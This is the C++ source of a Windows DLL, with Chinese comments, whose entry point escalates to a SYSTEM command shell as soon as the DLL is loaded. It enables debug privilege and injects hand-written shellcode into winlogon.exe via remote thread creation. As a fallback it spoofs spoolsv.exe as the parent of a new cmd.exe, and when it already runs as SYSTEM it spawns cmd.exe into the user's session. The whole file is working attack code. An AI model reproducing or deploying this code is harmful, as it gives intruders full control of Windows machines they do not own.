// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"

#include <userenv.h>
#include <wtsapi32.h>
#include <stdio.h>

#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <cstdint>

#pragma comment(lib, "WtsApi32.lib")
#pragma comment(lib, "Userenv.lib") 
//------------------------------------------------------------

/// <summary>
/// 检查当前用户是否为SYSTEM
/// </summary>
/// <returns>SYSTEM -> TRUE </returns>
BOOL CurrentUserIsLocalSystem()
{
	BOOL bIsLocalSystem = FALSE;
	PSID psidLocalSystem;
	SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

	BOOL fSuccess = AllocateAndInitializeSid(&ntAuthority, 1, SECURITY_LOCAL_SYSTEM_RID,
		0, 0, 0, 0, 0, 0, 0, &psidLocalSystem);
	if (fSuccess)
	{
		fSuccess = CheckTokenMembership(0, psidLocalSystem, &bIsLocalSystem);
		FreeSid(psidLocalSystem);
	}
	return bIsLocalSystem;
}
BOOL EnableDebugPriv()
{
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;

	if (!OpenProcessToken(GetCurrentProcess(),  // 要修改权限的进程句柄
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,  // 要对令牌进行何种操作
		&hToken                                 // 访问令牌
	))                               
	{
		return FALSE;
	}
	 
	if (!LookupPrivilegeValue(NULL,             // 查看的系统，本地为NULL
		SE_DEBUG_NAME,                          // 要查看的特权名称
		&sedebugnameValue                       // 用来接收标识符
	))

	{
		CloseHandle(hToken);
		return FALSE;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; //
	//调整访问令牌权限
	if (!AdjustTokenPrivileges(hToken,    //令牌句柄
		FALSE,           //是否禁用权限
		&tkp,            //新的特权的权限信息
		sizeof(tkp),     //特权信息大小
		NULL,            //用来接收特权信息当前状态的buffer
		NULL             //缓冲区大小
	))
	{
		CloseHandle(hToken);
		return FALSE;
	}
	else
	{
		printf("[+] AdjustTokenPrivileges successfully.\n");
		return TRUE;
	}
	return FALSE;
}
DWORD _stdcall LaunchProcess(LPSTR lpCommand)
{

	DWORD dwRet = 0;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	DWORD dwSessionId;//当前会话的ID  
	HANDLE hUserToken = NULL;//当前登录用户的令牌  
	HANDLE hUserTokenDup = NULL;//复制的用户令牌  
	HANDLE hPToken = NULL;//进程令牌  
	DWORD dwCreationFlags;

	//得到当前活动的会话ID，即登录用户的会话ID  
	dwSessionId = WTSGetActiveConsoleSessionId();
	do
	{
		WTSQueryUserToken(dwSessionId, &hUserToken);//读取当前登录用户的令牌信息  
		dwCreationFlags = NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE;//创建参数  

		ZeroMemory(&si, sizeof(STARTUPINFO));
		ZeroMemory(&pi, sizeof(pi));

		si.cb = sizeof(STARTUPINFO);
		si.lpDesktop = const_cast<char*>("winsta0\\default") ; // 指定创建进程的窗口站，Windows下唯一可交互的窗口站就是WinSta0\Default  

		TOKEN_PRIVILEGES tp;
		LUID luid;

		//打开进程令牌  
		if (!OpenProcessToken(GetCurrentProcess(),
			TOKEN_ADJUST_PRIVILEGES |
			TOKEN_QUERY |
			TOKEN_DUPLICATE |
			TOKEN_ASSIGN_PRIMARY |
			TOKEN_ADJUST_SESSIONID |
			TOKEN_READ |
			TOKEN_WRITE, &hPToken))
		{
			dwRet = GetLastError();
			break;
		}

		//查找DEBUG权限的UID  
		if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
		{
			dwRet = GetLastError();
			break;
		}

		//设置令牌信息  
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		//复制当前用户的令牌  
		if (!DuplicateTokenEx(hPToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification,
			TokenPrimary, &hUserTokenDup))
		{
			dwRet = GetLastError();
			break;
		}

		//设置当前进程的令牌信息  
		if (!SetTokenInformation(hUserTokenDup, TokenSessionId, (void*)&dwSessionId, sizeof(DWORD)))
		{
			dwRet = GetLastError();
			break;
		}

		//应用令牌权限  
		if (!AdjustTokenPrivileges(hUserTokenDup, FALSE, &tp, sizeof(TOKEN_PRIVILEGES),
			(PTOKEN_PRIVILEGES)NULL, NULL))
		{
			dwRet = GetLastError();
			break;
		}

		//创建进程环境块，保证环境块是在用户桌面的环境下  
		LPVOID pEnv = NULL;
		if (CreateEnvironmentBlock(&pEnv, hUserTokenDup, TRUE))
		{
			dwCreationFlags |= CREATE_UNICODE_ENVIRONMENT;
		}
		else
		{
			pEnv = NULL;
		}

		//创建用户进程  
		if (!CreateProcessAsUser(hUserTokenDup, NULL, lpCommand, NULL, NULL, FALSE,
			dwCreationFlags, pEnv, NULL, &si, &pi))
		{
			dwRet = GetLastError();
			break;
		}
	} while (0);

	//关闭句柄  
	if (NULL != hUserToken)
	{
		CloseHandle(hUserToken);
	}

	if (NULL != hUserTokenDup)
	{
		CloseHandle(hUserTokenDup);
	}

	if (NULL != hPToken)
	{
		CloseHandle(hPToken);
	}

	// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	return dwRet;
}


DWORD InjectSYSTEM(char* TarPorcess){
	
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	uint8_t shellcode[] = {
		 0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x6D, 0x64, 0x00, 0x54,
		 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76,
		 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17,
		 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,
		 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,
		 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99,
		 0xff, 0xc2, // inc edx (1 = SW_SHOW)
		 0xFF, 0xD7, 0x48, 0x83, 0xC4,
		 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3, 0x00
	};

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	int pid = -1;
	if (Process32First(snapshot, &entry) == TRUE) {
		while (Process32Next(snapshot, &entry) == TRUE) {
			if (lstrcmpiA(entry.szExeFile, TarPorcess) == 0) {
				pid = entry.th32ProcessID;
				break;
			}
		}
	}
	CloseHandle(snapshot);

	if (pid < 0) {
		printf("Could not find process");
		return -1;
	}
	printf("[*] Injecting shellcode in %s ...\n", TarPorcess);

	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProc == NULL) {
		printf("Could not open process");
		return -1;
	}

	LPVOID lpMem = VirtualAllocEx(hProc, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpMem == NULL) {
		printf("Remote allocation failed");
		return -1;
	}
	if (!WriteProcessMemory(hProc, lpMem, shellcode, sizeof(shellcode), 0)) {
		printf("Remote write failed");
		return -1;
	}
	if (!CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpMem, 0, 0, 0)) {
		printf("[-] CreateRemoteThread failed");
		return -1;
	}
	printf("Success! ;)\n");
	return 0;
}


void SetParent(char* TarPorcess) {
	PROCESSENTRY32 entry;
	HANDLE pHandle = NULL;
	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T size = 0;
	BOOL ret;
	entry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	int pid = -1;
	if (Process32First(snapshot, &entry) == TRUE) {
		while (Process32Next(snapshot, &entry) == TRUE) {


			// 进程名称相等时
			if (lstrcmpiA(entry.szExeFile, TarPorcess) == 0) {
				pid = entry.th32ProcessID;
				break;
			}
		}
	}
	CloseHandle(snapshot);

	if (pid < 0) {
		printf("Could not find process");
		return;
	}
	printf("[*] Injecting shellcode in %s ...\n", TarPorcess);

	// Open the process which we will inherit the handle from
	if ((pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)) == 0) {
		printf("Error opening PID %d\n", pid);
		return ;
	}

	// Create our PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute
	ZeroMemory(&si, sizeof(STARTUPINFOEXA));

	InitializeProcThreadAttributeList(NULL, 1, 0, &size);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
		GetProcessHeap(),
		0,
		size
	);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &pHandle, sizeof(HANDLE), NULL, NULL);

	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	// Finally, create the process
	ret = CreateProcessA(
		"C:\\Windows\\system32\\cmd.exe",
		NULL,
		NULL,
		NULL,
		true,
		EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		reinterpret_cast<LPSTARTUPINFOA>(&si),
		&pi
	);

	//关闭句柄  
	if (NULL != pi.hProcess)
	{
		CloseHandle(pi.hProcess);
	}

	if (NULL != pi.hThread)
	{
		CloseHandle(pi.hThread);
	}


	if (ret == false) {
		printf("Error creating new process (%d)\n", GetLastError());
		return ;
	}

}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		HANDLE Mutexlock;
		HANDLE threadHandle;
		char* TarPorcess;
		//获取调试权限
		if (!EnableDebugPriv()) {
			break;
		}
		else{
			Mutexlock = CreateMutex(NULL, FALSE, "938afa458ce812f897d936a1312cae687878a8a3");// 创建互斥量 
			if (GetLastError() == ERROR_ALREADY_EXISTS)
			{
				if (Mutexlock != 0) {
					CloseHandle(Mutexlock);
				}
				Mutexlock = NULL;
			}
			else {
				//如果已经是SYSTEM,通过CreateProcessAsUser session0穿透
				if (CurrentUserIsLocalSystem()) {
					threadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LaunchProcess, const_cast<char*>("C:\\Windows\\System32\\cmd.exe"), 0, NULL);
					if (threadHandle != 0) {
						CloseHandle(threadHandle);
					}
				}
				else {
						#ifdef _WIN32
						#ifdef _WIN64 
							// 注入到winlogon.exe (session=7 的system进程)
							TarPorcess = const_cast <char*>("winlogon.exe");  
							if (InjectSYSTEM(TarPorcess)) {
								// 备用方案
								TarPorcess = const_cast <char*>("spoolsv.exe");
								SetParent(TarPorcess);
							}
						#else
							// 在session7 （Process Explorer中session为7的进程）进程下，设置父进程，获得session=7的system权限cmd
							TarPorcess = const_cast <char*>("spoolsv.exe"); 
							SetParent(TarPorcess);
						#endif
						#else{  }
						#endif
				}
			}
		}
		Sleep(200);
		break;
	}
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
extern "C" __declspec(dllexport) void Run(HWND hwnd, HINSTANCE hinst) {}